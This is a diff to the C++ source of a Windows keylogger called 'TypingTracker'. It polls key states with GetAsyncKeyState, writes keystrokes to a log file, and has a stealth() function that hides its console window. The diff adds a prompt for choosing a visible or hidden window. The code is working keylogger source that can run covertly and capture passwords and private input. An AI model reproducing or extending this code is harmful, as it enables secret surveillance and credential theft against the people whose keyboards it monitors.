@@ -668,8 +668,6 @@ int save(const int key)
 		::backspace = 0;
 		sLogs += "/";
 		break;
-	default:
-		break;
 	}
 
 	out_file << sLogs; 
@@ -678,25 +676,40 @@ int save(const int key)
 	return 0;
 }
 
-void stealth() 
+void stealth(unsigned short int display_mode)
 {
 	HWND stealth;
 	AllocConsole();
 	stealth = FindWindowA("consoleWindowClass", NULL);
-	ShowWindow(stealth, 1); //1 - visible window, 0 - hidden window
+	ShowWindow(stealth, display_mode); //1 - visible window, 0 - hidden window
 }
 
 int main(int argc, char *argv[]) 
 {
-	stealth();
+	std::cout << "TypingTracker v0.2.1-alpha3\n" << std::endl;
+
+	unsigned short int display_mode;
+	std::cout << "Display mode 1 - visible window, 0 - hidden window" << std::endl;
+	std::cout << "Select display mode: ";
+	std::cin >> display_mode;
+
+	if (display_mode == 1 || display_mode == 0)
+	{
+		stealth(display_mode);
+	}
+	else
+	{
+		std::cout << "\nERROR!\a\nInvalid display mode value.\n" << std::endl;
+		exit(1);
+	}
 
 	char buffer[MAX_PATH];
 	::GetModuleFileNameA(NULL, buffer, MAX_PATH);
 
 	char i;
-	while (1) 
+	while (true) 
 	{
-		for (i = 8; i <= 190; i++) 
+		for (i = 8; i <= 190; i++)
 		{
 			if (GetAsyncKeyState(i) == -32767)
 			{
